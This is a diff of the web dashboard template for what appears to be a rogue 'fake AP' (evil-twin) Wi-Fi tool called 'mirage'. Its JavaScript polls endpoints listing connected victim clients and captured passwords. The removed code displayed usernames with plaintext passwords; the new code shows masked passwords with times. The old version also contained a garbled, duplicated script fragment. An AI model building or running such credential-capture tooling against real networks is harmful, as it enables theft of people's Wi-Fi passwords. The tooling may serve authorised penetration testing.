@@ -137,41 +137,25 @@
   </div>
   {% if active %}
   <script>
-    // Etat live : clients connectes au faux AP, rafraichis en continu.
     (function () {
-      var list = document.getElementById('clist');
-      var count = document.getElementById('ccount');
-      var empty = document.getElementById('cempty');
-      if (!list) return;
       function esc(s) {
         return String(s).replace(/[&<>"]/g, function (c) {
           return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c];
         });
       }
-      function refresh() {
+
+      function refreshClients() {
+        var list = document.getElementById('clist');
+        var count = document.getElementById('ccount');
+        var empty = document.getElementById('cempty');
+        if (!list) return;
+
         fetch('/mirage/clients', { cache: 'no-store' })
           .then(function (r) { return r.json(); })
-          .then(function (cs) {
-            count.textContent = cs.length;
-            empty.style.display = cs.length ? 'none' : 'block';
-            list.innerHTML = cs.map(function (c) {
-              return '<div class="cli"><span class="cn">' +
-                     esc(c.name || c.mac) + '</span><span class="cip">' +
-                     esc(c.ip) + '</span></div>';
-            }).join('');
-          })
-          .catch(function () {});
-      }
-      refresh();
-      setInterval(refresh, 3000);
-    })();
-  </scfunction refresh() {
-        fetch('/mirage/clients', { cache: 'no-store' })
-          .then(function (r) { return r.json(); })
-          .then(function (cs) {
-            count.textContent = cs.length;
-            empty.style.display = cs.length ? 'none' : 'block';
-            list.innerHTML = cs.map(function (c) {
+          .then(function (clients) {
+            count.textContent = clients.length;
+            empty.style.display = clients.length ? 'none' : 'block';
+            list.innerHTML = clients.map(function (c) {
               return '<div class="cli"><span class="cn">' +
                      esc(c.name || c.mac) + '</span><span class="cip">' +
                      esc(c.ip) + '</span></div>';
@@ -181,25 +165,35 @@
       }
 
       function refreshPasswords() {
+        var count = document.getElementById('pcount');
+        var list = document.getElementById('plist');
+        var empty = document.getElementById('pempty');
+        if (!list) return;
+
         fetch('/mirage/credentials', { cache: 'no-store' })
-          .then(function(r) { return r.json(); })
-          .then(function(cs) {
-            var pcount = document.getElementById('pcount');
-            var plist = document.getElementById('plist');
-            var pempty = document.getElementById('pempty');
-            if (!plist) return;
-            pcount.textContent = cs.length;
-            pempty.style.display = cs.length ? 'none' : 'block';
-            plist.innerHTML = cs.map(function(c) {
-              return '<div class="cli"><span class="cn">' + esc(c.username || '') + '</span><span class="cip">' + esc(c.password) + '</span></div>';
+          .then(function (r) { return r.json(); })
+          .then(function (captures) {
+            count.textContent = captures.length;
+            empty.style.display = captures.length ? 'none' : 'block';
+            list.innerHTML = captures.map(function (c) {
+              var time = '';
+              if (c.timestamp) {
+                var d = new Date(c.timestamp);
+                if (!isNaN(d.getTime())) {
+                  time = d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+                }
+              }
+              return '<div class="cli"><span class="cn">Password captured</span>' +
+                     '<span class="cip">' + esc(c.password_masked || '••••••••') +
+                     (time ? ' · ' + esc(time) : '') + '</span></div>';
             }).join('');
           })
-          .catch(function() {});
+          .catch(function () {});
       }
 
-      refresh();
+      refreshClients();
       refreshPasswords();
-      setInterval(refresh, 3000);
+      setInterval(refreshClients, 3000);
       setInterval(refreshPasswords, 3000);
     })();
   </script>
